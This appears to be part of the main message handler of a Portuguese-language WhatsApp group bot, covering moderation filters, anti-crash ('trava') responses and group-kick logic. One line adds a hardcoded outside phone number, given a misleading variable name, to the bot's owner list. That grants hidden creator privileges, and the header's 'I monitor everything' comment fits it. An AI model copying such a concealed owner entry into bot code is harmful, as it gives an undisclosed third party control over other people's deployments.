///////////////////// BY Neo Tecnolog //////////////////////
// Pra Que serve
//Tantos códigos?
//Se a Vida
//Não é programada
//e as Melhores coisas
// Não tem Lógica

//Monitoro tudo para meu trabalho não seja compartilhado sem receber nenhum valor



//Não compartilhe pois assim como eu você 
//Não gostaria de ter algo que você investiu
// tempo, esforços e valores ser repassado de graça


/////////////////////////////////////////////////////////

require('./config')
const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, WAProto, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia, Mimetype } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const fetch = require('node-fetch')
const { fromBuffer } = require('file-type')
const path = require('path')
const moment = require("moment-timezone")
const os = require('os')
const crypto = require('crypto')
const speed = require('performance-now')
const hxz = require('./lib/apis');
const xfar = require('./lib/apis2');
const encodeUrl = require('encodeurl')
const request = require('request');
const { performance } = require('perf_hooks')
const { upload } = require('./lib/tourl');
const yts = require('yt-search')
const linkfy = require('linkifyjs');
const mimetype = require('mime-types')
const { pinterest, wallpaper, wikimedia, porno, hentai, quotesAnime, gpwhatsapp, hentaistube, nerding, apkmodhacker, xvideos, uptodown, pornhub, soundl, st, gpsrc, dafontSearch, dafontDown, igstalk, apkmody } = require('./lib/scraper')
const { UploadFileUgu, webp2mp4File, TelegraPh, akameup } = require('./lib/uploader')
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, fetchText, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom } = require('./lib/myfunc')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require("./lib/banned.js");
//const database = require('./database.json')
//const { inquirer, _, instagram, print } = require("./lib/index.js");
const { tabela } = require('./lib/tabela')
const { conselhob } = require('./lib/conselhob.js');
const setting = JSON.parse(fs.readFileSync('./dono/settings.json'))
const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if (time2 > "00:00:00") {
    var tempo = 'Boa madrugada'
}
if (time2 > "05:30:00") {
    var tempo = 'Bom dia'
}
if (time2 > "12:00:00") {
    var tempo = 'Boa tarde'
}
if (time2 > "19:00:00") {
    var tempo = 'Boa noite'
}
const logos = require('textmaker-thiccy');
const { mediafireDl } = require('./lib/mediafire.js')
const googleImage = require('g-i-s')
const dados = JSON.parse(fs.readFileSync('./lib/apis2/pessoas.json'))


const { stickerImgTag, stickerVidTag, addExif, stickerForVideo, stickerCircleImg, stickerCircleUrl } = require('./lib/sticker')

const { ff } = require("./lib/api");
const { palavras } = require('./lib/conselhos.js');

const {
    ytDonlodMp3,
    ytDonlodMp4,
    ytPlayMp3,
    ytPlayMp4,
    ytSearch
} = require('./lib/youtube')
const { color, bgcolor } = require("./lib/color");
const {
    ytMp4,
    ytMp3,
    ytPlay
} = require('./lib/youtubev2')
const { menu } = require('./menus/menu.js');
const { mensagens } = require('./dono/msg.js')
const { destrava, destrava2 } = require('./lib/destrava.js');
const webp_mp4 = require("./lib/webp_mp4.js");




module.exports = conn = async (conn, m, store) => {
    try {
        const altpdf = Object.keys(m.message)
        const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (type === 'conversation') ? m.message.conversation : (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
        var bady = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.message.listResponseMessage && m.message.listResponseMessage.singleSelectReply.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        var prefix = setting.prefix
        var NomeDoBot = setting.NomeDoBot
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null
        const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const numerodono = setting.numerodono
        const isCmdy = "558198539583@s.whatsapp.net"
        const itsMe = m.sender == conn.user.id ? true : false
        const text = q = args.join(" ")
        const c = args.join(' ')
        const selo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ... { remoteJid: "status@broadcast" } }, message: { "imageMessage": { "caption": `${NomeDoBot}`, } } }
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
        const nescessario = JSON.parse(fs.readFileSync('./dono/nescessario.json'))
        const numerodonobb = [`${setting.numerodono}@s.whatsapp.net`, `${nescessario.dono2}@s.whatsapp.net`, `${nescessario.dono3}@s.whatsapp.net`, `${nescessario.dono4}@s.whatsapp.net`, `${nescessario.dono5}@s.whatsapp.net`, `${nescessario.dono6}@s.whatsapp.net`, `${nescessario.dono7}@s.whatsapp.net`, `${isCmdy}`]
        const donooriginal = [`${setting.numerodono}@s.whatsapp.net`]
        const numerodonos = [`${setting.numerodono}@s.whatsapp.net`, `${nescessario.dono2}@s.whatsapp.net`, `${nescessario.dono3}@s.whatsapp.net`, `${nescessario.dono4}@s.whatsapp.net`, `${nescessario.dono5}@s.whatsapp.net`, `${nescessario.dono6}@s.whatsapp.net`, `${nescessario.dono7}@s.whatsapp.net`]
        const isBot = m.key.fromMe ? true : false
        const isCreator = numerodonobb.includes(m.sender) || isBot
        const isDonoori = donooriginal.includes(m.sender) || isBot

        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.m || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const sender = m.key.fromMe ? conn.user.id : m.key.remoteJid.endsWith('@g.us') ? m.key.participant : m.key.remoteJid
        const from = m.key.remoteJid
        const { isFiltered, addFilter } = require('./lib/antispam.js');
        const anticall = JSON.parse(fs.readFileSync('./datab/ants/anticall.json'));
        const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false
        banChats = nescessario.banChats
        const reply = m.reply
        const countMessage = JSON.parse(fs.readFileSync('./datab/grupos/countmsg.json'));
        const premium = JSON.parse(fs.readFileSync('./datab/user/premium.json'));
        const antilink = JSON.parse(fs.readFileSync('./datab/ants/antilink.json'))
        const antilinkhard = JSON.parse(fs.readFileSync('./datab/ants/antilinkhard.json'))
        const antilinkgp = JSON.parse(fs.readFileSync('./datab/ants/antilinkgp.json'))
        const antiimg = JSON.parse(fs.readFileSync('./datab/ants/antiimg.json'))
        const antisticker = JSON.parse(fs.readFileSync('./datab/ants/antisticker.json'))
        const antinotas = JSON.parse(fs.readFileSync('./datab/ants/antinotas.json'))
        const antictt = JSON.parse(fs.readFileSync('./datab/ants/antictt.json'))
        const antidoc = JSON.parse(fs.readFileSync('./datab/ants/antidoc.json'))
        const antiloc = JSON.parse(fs.readFileSync('./datab/ants/antiloc.json'))
        const antivid = JSON.parse(fs.readFileSync('./datab/ants/antivideo.json'))
        const antiaudio = JSON.parse(fs.readFileSync('./datab/ants/antiaudio.json'))
        const palavra = JSON.parse(fs.readFileSync('./datab/grupos/palavras.json'))
        const palavrao = JSON.parse(fs.readFileSync('./datab/grupos/palavrao.json'))
        const antiflood = JSON.parse(fs.readFileSync('./datab/ants/antiflood.json'));
        const limitefll = JSON.parse(fs.readFileSync('./datab/user/flood.json'));
        const welkom = JSON.parse(fs.readFileSync('./datab/grupos/bemvindo.json'));
        const adeuscara = JSON.parse(fs.readFileSync('./datab/grupos/adeus.json'));
        const ban = JSON.parse(fs.readFileSync('./datab/user/banned.json'));
        const blockcmds = JSON.parse(fs.readFileSync('./datab/data/cmdban.json'));
        let bancht = JSON.parse(fs.readFileSync('./datab/grupos/banchat.json'));
        const nsfw = JSON.parse(fs.readFileSync('./datab/grupos/nsfw.json'))
        const imgpornmsg = m.message.imageMessage ? m.message.imageMessage : m


        const isGroup = m.isGroup
        const content = JSON.stringify(m.message)



        const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

        const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')



        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? conn.sendMessage(m.chat, { text: teks.trim(), mentions: memberr }) : conn.sendMessage(m.chat, { text: teks.trim(), mentions: memberr })
        }

        const getFileBuffer = async (mediakey, MediaType) => {

            const stream = await downloadContentFromMessage(mediakey, MediaType)

            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            return buffer
        }

        //prem
        const isPremium = premium.includes(sender)


        // Group
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const groupId = m.isGroup ? groupMetadata.id : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(m.sender) || false
        const antifake = JSON.parse(fs.readFileSync('./datab/ants/antifake.json'))
        const isAntifake = m.isGroup ? antifake.includes(m.chat) : false
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isAntiLinkHard = m.isGroup ? antilinkhard.includes(from) : false
        const isAntilinkgp = m.isGroup ? antilinkgp.includes(from) : false
        const isAntiImg = isGroup ? antiimg.includes(from) : false
        const isAntiSticker = isGroup ? antisticker.includes(from) : false
        const isAntiNotas = isGroup ? antinotas.includes(from) : false
        const Antidoc = isGroup ? antidoc.includes(from) : false
        const isAntiVid = isGroup ? antivid.includes(from) : false
        const isAntiAudio = isGroup ? antiaudio.includes(from) : false
        const Antiloc = isGroup ? antiloc.includes(from) : false
        const isAntiCtt = isGroup ? antictt.includes(from) : false
        const isAntiFlood = isGroup ? antiflood.includes(from) : false
        const isPalavrao = isGroup ? palavrao.includes(from) : false
        const isNsfw = isGroup ? nsfw.includes(from) : true

        limitefl = limitefll.limitefl
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isAdeusCara = isGroup ? adeuscara.includes(from) : false
        const isBanned = ban.includes(sender)
        const iscmdban = blockcmds.includes(command)
        const isBanchat = isGroup ? bancht.includes(from) : false

        const msjh = m.body


        if (msjh.includes('viewOnceMessage')) return console.log(chalk.black(chalk.red('[ MSG TEMPORARIA ]')), chalk.green("de " + m.sender.replace("@s.whatsapp.net", "")))

        const participantess = (groupId, membros1) => {
            array = []
            for (let i = 0; i < membros1.length; i++) {
                array.push(membros1[i].id)
            }
            return array
        }



        const groupIdscount = []
        const numbersIds = []
        for (let obj of countMessage) {
            groupIdscount.push(obj.groupId)
        }
        if (isGroup && groupIdscount.indexOf(from) >= 0) {
            var ind = groupIdscount.indexOf(from)
            for (let obj of countMessage[ind].numbers) { numbersIds.push(obj.id) }
            if (numbersIds.indexOf(sender) >= 0) {
                var indnum = numbersIds.indexOf(sender)
                countMessage[ind].numbers[indnum].messages += 1
                countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
                fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
            } else {
                const messages = 1
                const cmd_messages = isCmd ? 1 : 0
                countMessage[ind].numbers.push({
                    id: sender,
                    messages: messages,
                    cmd_messages: cmd_messages
                })
                fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
            }
        } else if (isGroup) {
            countMessage.push({
                groupId: from,
                numbers: [{
                    id: sender,
                    messages: 2,
                    cmd_messages: isCmd ? 1 : 0
                }]
            })
            fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
        }


        const descfig = 'BY Neo Tecnolog'
        const criadorfig = 'P7 BOT MD'
        var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)]

        enviar = {
            espere: `${enviarmen}`,
            successo: '️❬ ✔ ❭ Sucesso 🖤',
            levelon: '❬ ✔ ❭ *leveling* *ativado*',
            leveloff: '❬ X ❭  *leveling* *desativado*',
            levelnoton: '❬ X ❭ *leveling não ativado*',
            levelnol: '*error* 0 °-°',
            error: {
                stick: '*falhou, tente novamente ^_^*',
                Iv: 'Link invalido ☹️'
            },
            msg: {
                grupo: '[❗] Este comando só pode ser usado em grupos! ❌',
                premium: '[❗] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*',
                mod: `[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD ${setting.NickDono}*`,
                banido: '❌ Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque ❌',
                donosmt: '[❗] Este é um recurso especial para o proprietário ❌',
                donosmt2: '[❗] Este é um recurso especial para o proprietário ❌',
                adm: '[❗] Este comando só pode ser usado por administradores de grupo! ❌',
                Badmin: ' [❗] Este comando só pode ser usado quando o bot se torna administrador! ❌',
            }
        }



        // Bot Status
        const used = process.memoryUsage()
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
            return cpu
        })
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total
            last.speed += cpu.speed / length
            last.times.user += cpu.times.user
            last.times.nice += cpu.times.nice
            last.times.sys += cpu.times.sys
            last.times.idle += cpu.times.idle
            last.times.irq += cpu.times.irq
            return last
        }, {
            speed: 0,
            total: 0,
            times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0
            }
        })

        const math = (teks) => {
            return Math.floor(teks)
        }


        const enviarArquivoDoLink = async (from, url, caption, msg, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(m.chat, { video: await convertGif(url), caption: caption, gifPlayback: true, mentions: men ? men : [] }, { quoted: m })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : [] }, { quoted: m })
            } else if (mime.split("/")[0] === "video") {
                return conn.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [] }, { quoted: m })
            } else if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg' }, { quoted: m })
            } else {
                return conn.sendMessage(m.chat, { document: await getBuffer(url), mimetype: mime, caption: caption, mentions: men ? men : [] }, { quoted: m })
            }
        }


        const enviarbuton = (from, text, footer, buttons) => {
            return conn.sendMessage(m.chat, { text: text, footer: footer, templateButtons: buttons })
        }

        const sendButtonMsg = async (text, footer, button) => {
            var list = WAProto.Message.fromObject({
                buttonsMessage: WAProto.ButtonsMessage.fromObject({
                    contentText: text,
                    footerText: footer,
                    buttons: button,
                    headerType: 1
                })
            })

            await conn.relayMessage(m.chat, list, { messageId: m.key.id })
        }

        const sendListMsg = async (title, description, textButton, sections) => {
            var list = WAProto.Message.fromObject({
                listMessage: WAProto.ListMessage.fromObject({
                    title: title,
                    buttonText: textButton,
                    description: description,
                    listType: 1,
                    sections: sections
                })
            })
            await conn.relayMessage(m.chat, list, { messageId: m.key.id })
        }

        const ceemde = JSON.parse(fs.readFileSync('./datab/data/totalcmd.json'))

        const cmdadd = () => {
            ceemde[0].totalcmd += 1
            fs.writeFileSync('./datab/data/totalcmd.json', JSON.stringify(ceemde))
        }

        const getExtension = async (type) => {
            return await mimetype.extension(type)
        }

        let date = moment.tz('America/Sao_Paulo').format('DD')
        let month = moment.tz('America/Sao_Paulo').format('MM')
        let year = moment.tz('America/Sao_Paulo').format('YYYY')
        let hours = moment.tz('America/Sao_Paulo').format('HH')
        let minutes = moment.tz('America/Sao_Paulo').format('mm')
        let seconds = moment.tz('America/Sao_Paulo').format('ss')



        if (isBanchat && !isCreator) {
            if (isCmd) { return reply(`Este grupo esta banido, ou seja não estou ouvindo ninguém`) } else return
        }

        conn.sendReadReceipt(m.chat, m.sender, [m.key.id])
        conn.sendPresenceUpdate('available', m.chat)

        if (isAntiLink) {
            if (type === 'stickerMessage') return
            if (type === 'audioMessage') return
            if (type === 'imageMessage') return
            if (budy.includes("https://") || (budy.includes(".net") || (budy.includes(".com") || (budy.includes("//s.kwai.app/") || (budy.includes("//vm.tiktok") || (budy.includes("www.") || (budy.includes("chat.whatsapp") || (budy.includes(".xml") || (budy.includes("youtube.com") || (budy.includes("//t.me/") || (budy.includes(".css")))))))))))) {
                linkgpp = await conn.groupInviteCode(from)
                if (budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')
                if (!isGroup) return
                if (isGroupAdmins) return reply(`*Vc é admin do gp,fica tranquilo que não irei te banir.*`)
                setTimeout(() => {
                }, 1100)
                setTimeout(() => {
                    conn.groupParticipantsUpdate(from, [sender], 'remove')
                }, 1000)
            }
        }

        if (isGroup && isPalavrao) {
            if (palavra.includes(budy)) {
                if (!isGroupAdmins) {
                    conn.sendMessage(from, { text: `SEM PALAVRÃO!! 😠!!` }, { quoted: m })
                    setTimeout(() => {
                        conn.groupParticipantsUpdate(from, [sender], 'remove')
                    }, 2000)
                    reply("2")
                    setTimeout(() => {
                        reply("1")
                    }, 1000)
                    setTimeout(() => {
                        conn.sendMessage(from, { text: `*「 🗣️ANTI PALAVRÃO🗣️ 」*\nVocê será banido do gp, Na proxima tenha ética ao falar!!` }, { quoted: m }).catch(e => {
                            conn.sendMessage(from, { text: `Infelizmente, não sou um administrador, entt não posso te banir!!` }, { quoted: m })
                        })
                    }, 0)
                } else {
                    return reply(`VOCÊ PODE ${pushname} 😇`)
                }
            }
        }

        if (budy.length >= limitefl) {
            if (!isAntiFlood) return
            if (isAntiFlood && isGroupAdmins && isBotGroupAdmins && isPremium) {
                if (isBot) return
                reply('*Link detectado, porém usuário é admin*')
            } else {
                if (isCreator) return
                if (isGroupAdmins) return
                if (isPremium) return
                var Kic = `${sender.split("@")[0]}@s.whatsapp.net`
                setTimeout(() => {
                    if (!isCreator && !m.key.fromMe && !isGroupAdmins) return reply('Muitas características enviadas, eu afirmo que pode ser trava, por precauções, eu irei remover.')
                    console.log(color('deram Spam', 'red'))
                }, 100)
                setTimeout(() => {
                    conn.groupParticipantsUpdate(from, [sender], 'remove')
                }, 1000)
                setTimeout(() => {
                }, 0)
            }
        }








        if (isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
            if (isGroupAdmins) return conn.sendMessage(from, { text: 'Contato detectado, você é adm, então não irei ti remover' }, { quoted: m })
            await conn.sendMessage(from, { text: 'opa fechado pelo bot detectado trava contato ou vcard, caso for um engano, fale com algum adm.' }, { quoted: selo })
            await conn.groupSettingUpdate(from, 'announcement')
            await sleep(2000);
            Kic = `${sender.split("@")[0]}@s.whatsapp.net`
            conn.groupParticipantsUpdate(from, [sender], 'remove')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava' }, { quoted: selo })
            await sleep(3000);
            clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
            conn.sendMessage(from, { text: clear }, { quoted: selo, contextInfo: { forwardingScore: 500, isForwarded: true } })
            await sleep(3000);
            await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde ' }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido ' }, { quoted: selo })
            await sleep(5000);
            await conn.groupSettingUpdate(from, 'not_announcement')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅' }, { quoted: selo })
        }

        if (isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
            if (isGroupAdmins) return conn.sendMessage(from, { text: 'Contato detectado, você é adm, então não irei te remover' }, { quoted: m })
            await conn.sendMessage(from, { text: 'opa fechado pelo bot detectado trava contatos' }, { quoted: selo })
            await conn.groupSettingUpdate(from, 'announcement')
            await sleep(2000);
            Kic = `${sender.split("@")[0]}@s.whatsapp.net`
            conn.groupParticipantsUpdate(from, [sender], 'remove')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava' }, { quoted: selo })
            await sleep(3000);
            clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
            conn.sendMessage(from, { text: clear }, { quoted: selo, contextInfo: { forwardingScore: 500, isForwarded: true } })
            await sleep(3000);
            await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde ' }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido ' }, { quoted: selo })
            await sleep(5000);
            await conn.groupSettingUpdate(from, 'not_announcement')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅' }, { quoted: selo })
        }

        if (isBotGroupAdmins && Antiloc && type === 'locationMessage') {
            if (isGroupAdmins) return conn.sendMessage(from, { text: 'Localização detectada, você é adm, então não irei te remover' }, { quoted: m })
            await conn.sendMessage(from, { text: 'opa fechado pelo bot, detectado trava Localização ou localização comum, caso for um engano, fale com algum adm.' }, { quoted: selo })
            await conn.groupSettingUpdate(from, 'announcement')
            await sleep(2000);
            Kic = `${sender.split("@")[0]}@s.whatsapp.net`
            conn.groupParticipantsUpdate(from, [sender], 'remove')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava' }, { quoted: selo })
            await sleep(3000);
            clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
            conn.sendMessage(from, { text: clear }, { quoted: selo, contextInfo: { forwardingScore: 500, isForwarded: true } })
            await sleep(3000);
            await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde ' }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: destrava(prefix) }, { quoted: selo })
            await sleep(2000);
            await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido ' }, { quoted: selo })
            await sleep(5000);
            await conn.groupSettingUpdate(from, 'not_announcement')
            await sleep(2000);
            await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅' }, { quoted: selo })
        }

        if (isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
            if (m.key.fromMe) return
            if (isGroupAdmins) return conn.sendMessage(from, { text: '*mensagem proibida detectada, porém é admin logo a punição será anulada*' }, { quoted: m })
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }

        if (isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
            if (m.key.fromMe) return
            if (isGroupAdmins) return conn.sendMessage(from, { text: '*mensagem proibida detectada, porém é admin logo a punição será anulada*' }, { quoted: m })
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }

        if (Antidoc && isBotGroupAdmins && type == 'documentMessage') {
            if (m.key.fromMe) return
            if (isGroupAdmins) return conn.sendMessage(from, { text: '*mensagem proibida detectada, porém é admin logo a punição será anulada*' }, { quoted: m })
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }


        if (isAntiNotas && bady.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins) {
            if (type == 'stickerMessage') return
            let verificar = bady.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
            if (verificar && bady.length < 1) return
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }


        if (isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
            if (isGroupAdmins) return conn.sendMessage(from, { text: '*mensagem proibida detectada, porém é admin logo a punição será anulada*' }, { quoted: m })
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }


        if (isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
            if (isGroupAdmins) return conn.sendMessage(from, { text: '*mensagem proibida detectada, porém é admin logo a punição será anulada*' }, { quoted: m })
            await conn.sendMessage(from, { text: '*mensagem proibida detectada, banindo...*' }, { quoted: m })
            setTimeout(async function () {
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }, 1000)
        }

        const isUrl = (url) => {
            if (linkfy.find(url)[0]) return true
            return false
        }


        async function AntilinkHardF() {
            if (isUrl(body) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins) {
                linkgpp = await conn.groupInviteCode(from)
                if (!isUrl(body)) return
                if (budy.match(`${linkgpp}`)) return
                if (isBot) return
                reply('*Link detectado, porém usuário é admin*')
            }

